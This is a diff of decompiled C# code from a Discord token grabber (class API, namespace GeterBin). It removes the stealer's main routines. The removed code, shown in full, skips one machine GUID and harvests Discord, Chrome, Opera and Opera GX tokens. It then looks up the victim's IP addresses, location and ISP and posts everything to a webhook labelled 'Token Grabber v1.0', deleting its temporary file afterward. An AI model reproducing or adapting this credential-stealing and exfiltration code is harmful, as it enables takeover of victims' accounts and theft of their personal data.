@@ -3,20 +3,15 @@ using System.Collections.Generic;
 using System.Collections.Specialized;
 using System.IO;
 using System.Linq;
-using System.Management;
 using System.Net;
-using System.Net.Http;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading;
-using System.Web.Script.Serialization;
-using Microsoft.Win32;
-using What_is_My_Token;
 
 namespace GeterBin
 {
-	// Token: 0x02000004 RID: 4
-	public class API
+    // Token: 0x02000004 RID: 4
+    public class API
 	{
 		// Token: 0x06000005 RID: 5 RVA: 0x0000233C File Offset: 0x0000053C
 		private static string Sub(string _Cont)
@@ -107,100 +102,6 @@ namespace GeterBin
 				}
 			}
 			return token;
-		}
-
-		// Token: 0x06000009 RID: 9 RVA: 0x0000256C File Offset: 0x0000076C
-		public static void StartGet()
-		{
-			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
-			{
-				using (RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Cryptography"))
-				{
-					bool flag = Convert.ToString(registryKey2.GetValue("MachineGuid")) == "90059c37-1320-41a4-b58d-2b75a9850d2f";
-					if (!flag)
-					{
-						try
-						{
-							API.GetTokenFromDiscordApp();
-							API.GetTokenFromOpera();
-							API.GetTokenFromChrome();
-							API.GetTokenFromOperaGX();
-							API.Send(File.ReadAllText(API._savedTokens));
-							bool flag2 = File.Exists(API._savedTokens);
-							if (flag2)
-							{
-								File.Delete(API._savedTokens);
-							}
-						}
-						catch (Exception ex)
-						{
-						}
-					}
-				}
-			}
-		}
-
-		// Token: 0x0600000A RID: 10 RVA: 0x0000264C File Offset: 0x0000084C
-		private static void Send(string tokenReport)
-		{
-			try
-			{
-				API.Data data = new JavaScriptSerializer().Deserialize<API.Data>(API.wb.DownloadString("https://wtfismyip.com/json"));
-				string yourFuckingLocation = data.YourFuckingLocation;
-				string yourFuckingCountryCode = data.YourFuckingCountryCode;
-				string yourFuckingISP = data.YourFuckingISP;
-				string text = API.wb.DownloadString("https://api.ipify.org/");
-				string text2 = API.wb.DownloadString("https://api6.ipify.org/");
-				API.OperatingSystem();
-				HttpClient httpClient = new HttpClient();
-				Dictionary<string, string> nameValueCollection = new Dictionary<string, string>
-				{
-					{
-						"content",
-						string.Concat(new string[]
-						{
-							"**",
-							Environment.UserName,
-							"**\n\n**IP Information**\n✯ IPv4: ",
-							text,
-							"\n✯ IPv6: ",
-							text2,
-							"\n✯ Location: ",
-							yourFuckingLocation,
-							"\n✯ ISP: ",
-							yourFuckingISP,
-							"\n✯ Country Code: ",
-							yourFuckingCountryCode,
-							"\n\n**Discord Tokens**\n",
-							string.Join("\n", new string[]
-							{
-								tokenReport
-							}),
-							"\n\nPowered by AdhDev"
-						})
-					},
-					{
-						"username",
-						"Token Grabber v1.0"
-					},
-					{
-						"avatar_url",
-						"https://cdn.discordapp.com/avatars/405479178738204673/68b9f761fe310de01a20f72e969081cb.png?size=128"
-					}
-				};
-				httpClient.PostAsync(API.Hook, new FormUrlEncodedContent(nameValueCollection)).GetAwaiter().GetResult();
-			}
-			catch
-			{
-			}
-		}
-
-		// Token: 0x0600000B RID: 11 RVA: 0x000027D4 File Offset: 0x000009D4
-		public static string OperatingSystem()
-		{
-			object obj = (from ManagementObject x in new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get()
-						  select x.GetPropertyValue("Caption")).FirstOrDefault<object>();
-			return (obj != null) ? obj.ToString() : "Unknown";
 		}
 
 		// Token: 0x0600000C RID: 12 RVA: 0x00002834 File Offset: 0x00000A34
@@ -428,9 +329,6 @@ namespace GeterBin
 		// Token: 0x04000005 RID: 5
 		public static string _savedTokens = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\updatelogss.txt";
 
-		// Token: 0x04000006 RID: 6
-		private static WebClient wb = new WebClient();
-
 		// Token: 0x04000008 RID: 8
 		private static bool App = false;
 
@@ -446,23 +344,5 @@ namespace GeterBin
 		// Token: 0x0400000C RID: 12
 		private static bool OperaGX = false;
 
-		// Token: 0x02000009 RID: 9
-		private class Data
-		{
-			// Token: 0x17000004 RID: 4
-			// (get) Token: 0x0600001D RID: 29 RVA: 0x00002EE2 File Offset: 0x000010E2
-			// (set) Token: 0x0600001E RID: 30 RVA: 0x00002EEA File Offset: 0x000010EA
-			public string YourFuckingLocation { get; set; }
-
-			// Token: 0x17000005 RID: 5
-			// (get) Token: 0x0600001F RID: 31 RVA: 0x00002EF3 File Offset: 0x000010F3
-			// (set) Token: 0x06000020 RID: 32 RVA: 0x00002EFB File Offset: 0x000010FB
-			public string YourFuckingCountryCode { get; set; }
-
-			// Token: 0x17000006 RID: 6
-			// (get) Token: 0x06000021 RID: 33 RVA: 0x00002F04 File Offset: 0x00001104
-			// (set) Token: 0x06000022 RID: 34 RVA: 0x00002F0C File Offset: 0x0000110C
-			public string YourFuckingISP { get; set; }
-		}
 	}
 }
